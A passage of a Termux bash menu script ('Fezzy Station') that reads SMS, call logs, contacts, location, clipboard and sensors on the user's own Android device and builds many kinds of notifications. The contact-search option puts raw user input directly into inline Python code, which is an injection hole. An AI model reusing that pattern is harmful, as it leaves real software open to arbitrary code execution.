        printf "  ${WH}[21] Download Complete — with file name and path                     ${RESET}\n"
        printf "  ${WH}[22] Battery Alert — fires when battery hits threshold               ${RESET}\n"
        printf "  ${WH}[23] Custom Sound — pick your own notification tone                  ${RESET}\n"
        printf "  ${WH}[24] Fezzy Station Alert — SOI branded · Bojack commentary           ${RESET}\n"
        echo ""
        _dv14
        echo ""
        printf "  ${C14}${BOLD}── AUTOMATION ──────────────────────────────────────────────${RESET}\n"
        echo ""
        printf "  ${WH}[25] Auto-Brightness — toggle by time of day                         ${RESET}\n"
        printf "  ${WH}[26] Screen Timeout — set display timeout duration                   ${RESET}\n"
        printf "  ${WH}[27] Do Not Disturb — toggle DnD mode                                ${RESET}\n"
        printf "  ${WH}[28] Scheduled SMS — send SMS at a specific time                     ${RESET}\n"
        printf "  ${WH}[29] WiFi Scan — list all nearby networks                            ${RESET}\n"
        printf "  ${WH}[30] App List — show all installed apps                              ${RESET}\n"
        printf "  ${WH}[31] Clipboard History Dump — dump clipboard to file                 ${RESET}\n"
        printf "  ${WH}[32] Screenshot — capture screen now                                 ${RESET}\n"
        printf "  ${WH}[33] Sensor Reader — accelerometer · light · proximity               ${RESET}\n"
        echo ""
        printf "  ${C14}${BOLD}── PERMANENT NOTIFICATIONS ─────────────────────────────────${RESET}\n"
        echo ""
        printf "  ${WH}[34] Permanent Notification Builder — create ongoing Android alerts   ${RESET}\n"
        printf "       ${FADE}■ Battery charging · WiFi disconnect · Custom · Persistent tray${RESET}\n"
        echo ""
        printf "  ${C14}${BOLD}── CUSTOM NOTIFICATION BUILDER ─────────────────────────────${RESET}\n"
        echo ""
        printf "  ${WH}[35] Reminder Notification    — fire once at exact HH:MM time        ${RESET}\n"
        printf "  ${WH}[36] Open-URL Action Notif    — tap notification to open a URL        ${RESET}\n"
        printf "  ${WH}[37] Media-Style Notification — artist · track · album in tray        ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv14
        echo ""
        _hover_hint "android"
        echo ""
        printf "  ${C14}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""
                printf "  ${C14}SMS Menu:${RESET}\n\n"
                printf "  ${WH}[1] Read inbox (last 10)  [2] Send SMS${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r sm
                case "$sm" in
                    1) echo ""
                       printf "  ${C14}[*] Reading inbox...${RESET}\n\n"
                       termux-sms-list -l 10 -t inbox 2>/dev/null | python3 -c "
import sys,json
msgs=json.load(sys.stdin)
for m in msgs:
    print(f\"  From: {m.get('number','?')}  |  {m.get('received','?')}\")
    print(f\"  {m.get('body','')}\")
    print()
" 2>/dev/null || printf "  ${RED}termux-sms-list failed — install termux-api pkg + companion app${RESET}\n" ;;
                    2) printf "  ${WH}Phone number: ${RESET}"; read -r ph
                       [[ -z "$ph" ]] && continue
                       printf "  ${WH}Message: ${RESET}"; read -r msg
                       [[ -z "$msg" ]] && continue
                       termux-sms-send -n "$ph" "$msg" 2>/dev/null && printf "  ${GRN}✓ Sent${RESET}\n" || printf "  ${RED}Failed — termux-api required${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${C14}[*] Call log (last 10)...${RESET}\n\n"
                termux-call-log -l 10 2>/dev/null | python3 -c "
import sys,json
calls=json.load(sys.stdin)
for c in calls:
    print(f\"  {c.get('type','?'):10s}  {c.get('number','?'):20s}  {c.get('duration','?')}s  {c.get('date','?')}\")
" 2>/dev/null || printf "  ${RED}termux-call-log failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C14}Camera:${RESET}\n\n"
                printf "  ${WH}[1] Take photo (camera 0)  [2] Take photo (front cam)  [3] List cameras${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r cm
                local ts; ts=$(date +%Y%m%d_%H%M%S)
                case "$cm" in
                    1) local out="$DLDIR/photo_${ts}.jpg"
                       termux-camera-photo -c 0 "$out" 2>/dev/null && printf "  ${GRN}✓ Photo saved: %s${RESET}\n" "$out" || printf "  ${RED}Failed${RESET}\n" ;;
                    2) local out="$DLDIR/selfie_${ts}.jpg"
                       termux-camera-photo -c 1 "$out" 2>/dev/null && printf "  ${GRN}✓ Selfie saved: %s${RESET}\n" "$out" || printf "  ${RED}Failed${RESET}\n" ;;
                    3) termux-camera-info 2>/dev/null || printf "  ${RED}Failed${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                printf "  ${C14}[*] Getting GPS location...${RESET}\n\n"
                printf "  ${FADE}(may take 10-30 seconds for GPS fix)${RESET}\n\n"
                termux-location 2>/dev/null | python3 -c "
import sys,json
loc=json.load(sys.stdin)
lat=loc.get('latitude','?')
lng=loc.get('longitude','?')
acc=loc.get('accuracy','?')
print(f'  Latitude  : {lat}')
print(f'  Longitude : {lng}')
print(f'  Accuracy  : {acc}m')
print(f'  Maps URL  : https://maps.google.com/?q={lat},{lng}')
" 2>/dev/null || printf "  ${RED}Location failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                printf "  ${C14}Clipboard:${RESET}\n\n"
                printf "  ${WH}[1] Get clipboard  [2] Set clipboard${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r clm
                case "$clm" in
                    1) echo ""
                       printf "  ${C14}[*] Current clipboard:${RESET}\n\n"
                       termux-clipboard-get 2>/dev/null | sed 's/^/  /' || printf "  ${RED}Failed${RESET}\n" ;;
                    2) printf "  ${WH}Text to copy: ${RESET}"; read -r txt
                       [[ -z "$txt" ]] && continue
                       echo "$txt" | termux-clipboard-set 2>/dev/null && printf "  ${GRN}✓ Copied to clipboard${RESET}\n" || printf "  ${RED}Failed${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C14}[*] Active notifications...${RESET}\n\n"
                termux-notification-list 2>/dev/null | python3 -c "
import sys,json
notifs=json.load(sys.stdin)
for n in notifs:
    print(f\"  [{n.get('packageName','?')}]\")
    print(f\"  Title  : {n.get('title','')}\")
    print(f\"  Content: {n.get('content','')}\")
    print()
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${WH}Duration ms [default 500]: ${RESET}"; read -r dur
                [[ -z "$dur" ]] && dur=500
                termux-vibrate -d "$dur" -f 2>/dev/null && printf "  ${GRN}✓ Vibrated %sms${RESET}\n" "$dur" || printf "  ${RED}Failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C14}Torch:${RESET}\n\n"
                printf "  ${WH}[1] On  [2] Off${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r tm
                case "$tm" in
                    1) termux-torch on 2>/dev/null && printf "  ${GRN}✓ Torch ON${RESET}\n" || printf "  ${RED}Failed${RESET}\n" ;;
                    2) termux-torch off 2>/dev/null && printf "  ${GRN}✓ Torch OFF${RESET}\n" || printf "  ${RED}Failed${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${C14}[*] Battery status...${RESET}\n\n"
                timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -E "percentage|status|temperature|health|plugged" | sed 's/^/  /' || printf "  ${RED}Termux:API not installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""; printf "  ${WH}Name to search: ${RESET}"; read -r name
                [[ -z "$name" ]] && continue
                echo ""
                printf "  ${C14}[*] Searching contacts for '%s'...${RESET}\n\n" "$name"
                termux-contact-list 2>/dev/null | python3 -c "
import sys,json
name='$name'.lower()
contacts=json.load(sys.stdin)
found=[c for c in contacts if name in c.get('name','').lower()]
for c in found:
    print(f\"  {c.get('name','?'):30s}  {c.get('number','?')}\")
if not found:
    print('  No matches found')
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C14}[*] WiFi info...${RESET}\n\n"
                termux-wifi-connectioninfo 2>/dev/null | python3 -c "
import sys,json
w=json.load(sys.stdin)
print(f\"  SSID       : {w.get('ssid','?')}\")
print(f\"  BSSID      : {w.get('bssid','?')}\")
print(f\"  IP Address : {w.get('ip','?')}\")
print(f\"  Signal     : {w.get('rssi','?')} dBm\")
print(f\"  Speed      : {w.get('link_speed_mbps','?')} Mbps\")
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
                printf "  ${C14}Volume:${RESET}\n\n"
                printf "  ${WH}[1] Get current volume  [2] Set volume${RESET}\n"
                echo ""; printf "  ${WH}Mode: ${RESET}"; read -r vm
                case "$vm" in
                    1) termux-volume 2>/dev/null || printf "  ${RED}Failed${RESET}\n" ;;
                    2) printf "  ${WH}Stream [music/call/ring/alarm]: ${RESET}"; read -r stream
                       printf "  ${WH}Volume level [0-15]: ${RESET}"; read -r vol
                       termux-volume "$stream" "$vol" 2>/dev/null && printf "  ${GRN}✓ Volume set${RESET}\n" || printf "  ${RED}Failed${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""; printf "  ${WH}Toast message: ${RESET}"; read -r msg
                [[ -z "$msg" ]] && continue
                termux-toast -s "$msg" 2>/dev/null && printf "  ${GRN}✓ Toast sent${RESET}\n" || printf "  ${RED}Failed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""
                printf "  ${C14}[*] Installing termux-api...${RESET}\n\n"
                pkg install termux-api
                echo ""
                printf "  ${WH}Also install the Termux:API companion app from F-Droid:${RESET}\n"
                printf "  ${CY}https://f-droid.org/packages/com.termux.api/${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""
                printf "  ${C14}[*] Basic Notification${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Notification from Fezzy Station"
                termux-notification --title "$ntitle" --content "$nmsg" --id 1001 2>/dev/null \
                    && printf "  ${GRN}✓ Notification sent${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                echo ""
                printf "  ${C14}[*] Big Text Notification${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Long message (expands on tap): ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Strategy Over Impulse — think before you pull."
                termux-notification --title "$ntitle" --content "$nmsg" --style bigtext --id 1002 2>/dev/null \
                    && printf "  ${GRN}✓ Big Text notification sent${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17)
                echo ""
                printf "  ${C14}[*] Heads-Up Notification (pops on screen)${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="⚡ FEZZY ALERT"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Urgent: Bojack requires attention"
                termux-notification --title "$ntitle" --content "$nmsg" --priority high --id 1003 2>/dev/null \
                    && printf "  ${GRN}✓ Heads-Up notification sent${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            18)
                echo ""
                printf "  ${C14}[*] Silent Notification (tray only, no sound/popup)${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Silent operation complete"
                termux-notification --title "$ntitle" --content "$nmsg" --priority min --id 1004 2>/dev/null \
                    && printf "  ${GRN}✓ Silent notification sent (check tray)${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            19)
                echo ""
                printf "  ${C14}[*] Ongoing Notification (persistent)${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="🐾 Bojack is watching"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Fezzy Station — Strategy Over Impulse · 999"
                printf "  ${WH}Notification ID for dismissal [default: 2001]: ${RESET}"; read -r nid
                [[ -z "$nid" ]] && nid=2001
                termux-notification --title "$ntitle" --content "$nmsg" --ongoing --id "$nid" 2>/dev/null \
                    && printf "  ${GRN}✓ Ongoing notification set (ID: %s)${RESET}\n" "$nid" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                printf "  ${FADE}To dismiss: termux-notification-remove %s${RESET}\n" "$nid"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            20)
                echo ""
                printf "  ${C14}[*] Scheduled Notification${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Scheduled alert from Fezzy Station"
                printf "  ${WH}Delay in seconds: ${RESET}"; read -r ndelay
                [[ -z "$ndelay" || ! "$ndelay" =~ ^[0-9]+$ ]] && ndelay=60
                ( sleep "$ndelay" && termux-notification --title "$ntitle" --content "$nmsg" --priority high --id 1005 2>/dev/null ) &
                printf "  ${GRN}✓ Scheduled in %s seconds — PID: %s${RESET}\n" "$ndelay" "$!"
                printf "  ${FADE}Runs in background · terminal can stay open${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            21)
                echo ""
                printf "  ${C14}[*] Download Complete Notification${RESET}\n\n"
                printf "  ${WH}File name: ${RESET}"; read -r fname
                [[ -z "$fname" ]] && fname="download.zip"
                printf "  ${WH}File path [ENTER for %s]: ${RESET}" "$DLDIR"; read -r fpath
                [[ -z "$fpath" ]] && fpath="$DLDIR"
                termux-notification \
                    --title "✅ Download Complete" \
                    --content "$fname — saved to $fpath" \
                    --style bigtext \
                    --id 1006 2>/dev/null \
                    && printf "  ${GRN}✓ Download Complete notification sent${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            22)
                echo ""
                printf "  ${C14}[*] Battery Alert — fires when battery drops below threshold${RESET}\n\n"
                printf "  ${WH}Alert threshold %% [default: 20]: ${RESET}"; read -r bthresh
                [[ -z "$bthresh" || ! "$bthresh" =~ ^[0-9]+$ ]] && bthresh=20
                printf "  ${WH}Alert message [ENTER for default]: ${RESET}"; read -r bamsg
                [[ -z "$bamsg" ]] && bamsg="Bojack says: plug me in · ${bthresh}%% threshold hit"
                (
                    while true; do
                        local bpct
                        bpct=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1)
                        local bstat
                        bstat=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"status":"\K[^"]+' | head -1)
                        if [[ -n "$bpct" && "$bpct" -le "$bthresh" && "$bstat" != "CHARGING" ]]; then
                            termux-notification \
                                --title "🔋 Battery Alert — ${bpct}%" \
                                --content "$bamsg" \
                                --priority high \
                                --id 1007 2>/dev/null
                            break
                        fi
                        sleep 60
                    done
                ) &
                printf "  ${GRN}✓ Battery watcher started — PID: %s · checks every 60s${RESET}\n" "$!"
                printf "  ${FADE}Fires once when battery ≤ %s%% and not charging${RESET}\n" "$bthresh"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            23)
                echo ""
                printf "  ${C14}[*] Custom Sound Notification${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Custom alert"
                printf "  ${WH}Sound file path (e.g. /sdcard/Music/tone.mp3): ${RESET}"; read -r sfile
                if [[ -n "$sfile" && -f "$sfile" ]]; then
                    termux-notification --title "$ntitle" --content "$nmsg" --sound-file "$sfile" --id 1008 2>/dev/null \
                        && printf "  ${GRN}✓ Custom sound notification sent${RESET}\n" \
                        || printf "  ${RED}Failed — termux-api required${RESET}\n"
                else
                    printf "  ${YEL}[!] File not found — sending with default sound${RESET}\n"
                    termux-notification --title "$ntitle" --content "$nmsg" --id 1008 2>/dev/null \
                        && printf "  ${GRN}✓ Notification sent (default sound)${RESET}\n" \
                        || printf "  ${RED}Failed — termux-api required${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            24)
                echo ""
                _dv14
                printf "  ${HOT}${BOLD}🐾 FEZZY PORTALS ALERT  —  SOI · 999 · Bojack K9${RESET}\n"
                _dv14
                echo ""
                local soi_alerts=(
                    "Strategy Over Impulse — think before you pull."
                    "Bojack never tells. Neither does the archive."
                    "999 — what goes up never comes down."
                    "Move in silence. Let the downloads speak."
                    "The operation unseen is the operation that succeeds."
                    "Supreme excellence is pulling before they know you were there."
                )
                local rand_soi="${soi_alerts[$((RANDOM % ${#soi_alerts[@]}))]}"
                printf "  ${WH}Custom message [ENTER for SOI quote]: ${RESET}"; read -r cmsg
                [[ -z "$cmsg" ]] && cmsg="$rand_soi"
                termux-notification \
                    --title "🐾 FEZZY PORTALS · SOI · 999" \
                    --content "$cmsg" \
                    --style bigtext \
                    --priority high \
                    --id 999 2>/dev/null \
                    && printf "  ${GRN}✓ SOI Alert fired — Bojack never tells${RESET}\n" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            25)
                echo ""
                printf "  ${C14}[*] Auto-Brightness by Time of Day${RESET}\n\n"
                local hour; hour=$(( 10#$(date +%H) ))
                local brightness label
                if   (( hour >= 6  && hour < 9  )); then brightness=128; label="Morning"
                elif (( hour >= 9  && hour < 17 )); then brightness=200; label="Daytime"
                elif (( hour >= 17 && hour < 20 )); then brightness=150; label="Evening"
                elif (( hour >= 20 && hour < 23 )); then brightness=80;  label="Night"
                else                                     brightness=30;  label="Deep Night"
                fi
                printf "  ${WH}Time profile: %s  →  Brightness: %s/255${RESET}\n\n" "$label" "$brightness"
                termux-brightness "$brightness" 2>/dev/null \
                    && printf "  ${GRN}✓ Brightness set to %s (%s mode)${RESET}\n" "$brightness" "$label" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                printf "  ${WH}Manual override 0-255 [ENTER to keep]: ${RESET}"; read -r bval
                if [[ -n "$bval" && "$bval" =~ ^[0-9]+$ && "$bval" -le 255 ]]; then
                    termux-brightness "$bval" 2>/dev/null \
                        && printf "  ${GRN}✓ Brightness set to %s${RESET}\n" "$bval"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            26)
                echo ""
                printf "  ${C14}[*] Screen Timeout Setter${RESET}\n\n"
                printf "  ${WH}[1] 30s  [2] 1min  [3] 2min  [4] 5min  [5] 10min  [6] Custom ms${RESET}\n\n"
                printf "  ${WH}Choice: ${RESET}"; read -r stc
                local timeout_ms
                case "$stc" in
                    1) timeout_ms=30000  ;;
                    2) timeout_ms=60000  ;;
                    3) timeout_ms=120000 ;;
                    4) timeout_ms=300000 ;;
                    5) timeout_ms=600000 ;;
                    6) printf "  ${WH}Timeout in ms: ${RESET}"; read -r timeout_ms ;;
                    *) timeout_ms=60000  ;;
                esac
                settings put system screen_off_timeout "$timeout_ms" 2>/dev/null \
                    && printf "  ${GRN}✓ Screen timeout set to %sms${RESET}\n" "$timeout_ms" \
                    || printf "  ${YEL}[!] Needs ADB: adb shell settings put system screen_off_timeout %s${RESET}\n" "$timeout_ms"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            27)
                echo ""
                printf "  ${C14}[*] Do Not Disturb Toggle${RESET}\n\n"
                printf "  ${WH}[1] Enable DnD   [2] Disable DnD${RESET}\n\n"
                printf "  ${WH}Choice: ${RESET}"; read -r dnd
                case "$dnd" in
                    1) cmd notification set_dnd on 2>/dev/null \
                           && printf "  ${GRN}✓ Do Not Disturb enabled${RESET}\n" \
                           || printf "  ${YEL}[!] May need ADB: adb shell cmd notification set_dnd on${RESET}\n" ;;
                    2) cmd notification set_dnd off 2>/dev/null \
                           && printf "  ${GRN}✓ Do Not Disturb disabled${RESET}\n" \
                           || printf "  ${YEL}[!] May need ADB: adb shell cmd notification set_dnd off${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            28)
                echo ""
                printf "  ${C14}[*] Scheduled SMS Sender${RESET}\n\n"
                printf "  ${WH}Phone number: ${RESET}"; read -r sph
                [[ -z "$sph" ]] && { printf "  ${RED}No number${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Message: ${RESET}"; read -r smsmsg
                [[ -z "$smsmsg" ]] && { printf "  ${RED}No message${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Delay in seconds: ${RESET}"; read -r smsdelay
                [[ -z "$smsdelay" || ! "$smsdelay" =~ ^[0-9]+$ ]] && smsdelay=60
                ( sleep "$smsdelay" \
                    && termux-sms-send -n "$sph" "$smsmsg" 2>/dev/null \
                    && termux-notification --title "✅ SMS Sent" --content "To: $sph" --id 1009 2>/dev/null ) &
                printf "  ${GRN}✓ SMS queued in %s seconds — PID: %s${RESET}\n" "$smsdelay" "$!"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            29)
                echo ""
                printf "  ${C14}[*] WiFi Scan — nearby networks...${RESET}\n\n"
                termux-wifi-scaninfo 2>/dev/null | python3 -c "
import sys,json
try:
    nets=json.load(sys.stdin)
    print(f'  {len(nets)} network(s) found:\n')
    for n in nets:
        print(f'  SSID     : {n.get(\"ssid\",\"Hidden\")}')
        print(f'  BSSID    : {n.get(\"bssid\",\"?\")}')
        print(f'  Signal   : {n.get(\"level\",\"?\")} dBm')
        print(f'  Frequency: {n.get(\"frequency\",\"?\")} MHz')
        print(f'  Security : {n.get(\"capabilities\",\"?\")}')
        print()
except Exception as e: print(f'  Error: {e}')
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            30)
                echo ""
                printf "  ${C14}[*] Installed Apps${RESET}\n\n"
                printf "  ${WH}[1] All apps  [2] User-installed only  [3] Search by name${RESET}\n\n"
                printf "  ${WH}Mode: ${RESET}"; read -r alm
                echo ""
                case "$alm" in
                    1) pm list packages 2>/dev/null | sed 's/package:/  /' | sort | less -R ;;
                    2) pm list packages -3 2>/dev/null | sed 's/package:/  /' | sort | less -R ;;
                    3) printf "  ${WH}Search: ${RESET}"; read -r aterm
                       pm list packages 2>/dev/null | grep -i "$aterm" | sed 's/package:/  /' | sort ;;
                    *) pm list packages 2>/dev/null | sed 's/package:/  /' | sort | head -50 ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            31)
                echo ""
                printf "  ${C14}[*] Clipboard History Dump${RESET}\n\n"
                local clipout="$DLDIR/clipboard_dump_$(date +%Y%m%d_%H%M%S).txt"
                local current; current=$(termux-clipboard-get 2>/dev/null)
                if [[ -n "$current" ]]; then
                    { echo "=== Clipboard Dump · $(date) ==="; echo ""; echo "$current"; } > "$clipout"
                    printf "  ${GRN}✓ Saved to: %s${RESET}\n\n" "$clipout"
                    printf "  ${C14}[PREVIEW]:${RESET}\n\n"
                    echo "$current" | head -10 | sed 's/^/  /'
                    cp "$clipout" /sdcard/Download/ 2>/dev/null \
                        && printf "\n  ${GRN}✓ Also in /sdcard/Download/${RESET}\n"
                else
                    printf "  ${YEL}[!] Clipboard empty or termux-api unavailable${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            32)
                echo ""
                printf "  ${C14}[*] Screenshot${RESET}\n\n"
                local ssout="/sdcard/Download/fezzy_ss_$(date +%Y%m%d_%H%M%S).png"
                screencap -p "$ssout" 2>/dev/null \
                    && printf "  ${GRN}✓ Screenshot saved: %s${RESET}\n" "$ssout" \
                    || {
                        printf "  ${YEL}[!] screencap failed — trying termux-screenshot...${RESET}\n"
                        termux-screenshot -f "$ssout" 2>/dev/null \
                            && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$ssout" \
                            || printf "  ${RED}Failed — grant storage permission or enable Accessibility Service${RESET}\n"
                    }
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            33)
                echo ""
                printf "  ${C14}[*] Sensor Reader${RESET}\n\n"
                printf "  ${WH}[1] Accelerometer  [2] Light  [3] Proximity  [4] List all${RESET}\n\n"
                printf "  ${WH}Choice: ${RESET}"; read -r src
                echo ""
                case "$src" in
                    1) printf "  ${C14}[*] Accelerometer (1 reading)...${RESET}\n\n"
                       termux-sensor -s accelerometer -n 1 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    vals=d.get('values',[])
    print(f'  X: {vals[0] if len(vals)>0 else \"?\"}')
    print(f'  Y: {vals[1] if len(vals)>1 else \"?\"}')
    print(f'  Z: {vals[2] if len(vals)>2 else \"?\"}')
except: print('  Sensor read failed')
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n" ;;
                    2) printf "  ${C14}[*] Light sensor (1 reading)...${RESET}\n\n"
                       termux-sensor -s light -n 1 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    vals=d.get('values',[])
    print(f'  Light: {vals[0] if vals else \"?\"} lux')
except: print('  Sensor read failed')
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n" ;;
                    3) printf "  ${C14}[*] Proximity sensor (1 reading)...${RESET}\n\n"
                       termux-sensor -s proximity -n 1 2>/dev/null | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    vals=d.get('values',[])
    dist=vals[0] if vals else '?'
    state='NEAR' if isinstance(dist,(int,float)) and dist < 5 else 'FAR'
    print(f'  Proximity: {dist} cm  [{state}]')
except: print('  Sensor read failed')
" 2>/dev/null || printf "  ${RED}Failed — termux-api required${RESET}\n" ;;
                    4) printf "  ${C14}[*] Available sensors:${RESET}\n\n"
                       termux-sensor -l 2>/dev/null | sed 's/^/  /' || printf "  ${RED}Failed — termux-api required${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            34)
                while true; do
                    clear
                    echo ""
                    _dv14
                    printf "  ${C14}${BOLD}PERMANENT NOTIFICATION BUILDER  —  Android · Ongoing Alerts${RESET}\n"
                    _dv14
                    echo ""
                    printf "  ${FADE}■ These notifications stay in your tray permanently until you remove them${RESET}\n"
                    printf "  ${FADE}■ Requires termux-api pkg + Termux:API companion app installed${RESET}\n"
                    echo ""
                    _dv14
                    echo ""
                    printf "  ${C14}${BOLD}── CREATE PERMANENT NOTIFICATION ──────────────────────────────────${RESET}\n"
                    printf "  ${WH}[1]  Battery Charging Alert   — notify when plugged in / charging    ${RESET}\n"
                    printf "  ${WH}[2]  Battery Low Alert        — warn when battery drops below level  ${RESET}\n"
                    printf "  ${WH}[3]  WiFi Disconnect Alert    — ongoing alert when WiFi is lost      ${RESET}\n"
                    printf "  ${WH}[4]  WiFi Connected Alert     — show current SSID in tray            ${RESET}\n"
                    printf "  ${WH}[5]  Custom Ongoing           — your own title + message, stays      ${RESET}\n"
                    printf "  ${WH}[6]  Fezzy Station Active     — SOI permanent tray indicator         ${RESET}\n"
                    printf "  ${WH}[7]  Download Running         — show download in-progress badge      ${RESET}\n"
                    printf "  ${WH}[8]  VNC Server Active        — remind you VNC is running on :1      ${RESET}\n"
                    echo ""
                    printf "  ${C14}${BOLD}── MANAGE ──────────────────────────────────────────────────────────${RESET}\n"
                    printf "  ${WH}[9]  Remove notification by ID                                       ${RESET}\n"
                    printf "  ${WH}[10] List all active notifications                                   ${RESET}\n"
                    printf "  ${WH}[11] Remove ALL Fezzy notifications (IDs 3001–3020)                  ${RESET}\n"
                    echo ""
                    printf "  ${C14}${BOLD}── AUTO-WATCHERS (foreground loops) ────────────────────────────────${RESET}\n"
                    printf "  ${WH}[12] Battery watcher — fires notification when charging state changes ${RESET}\n"
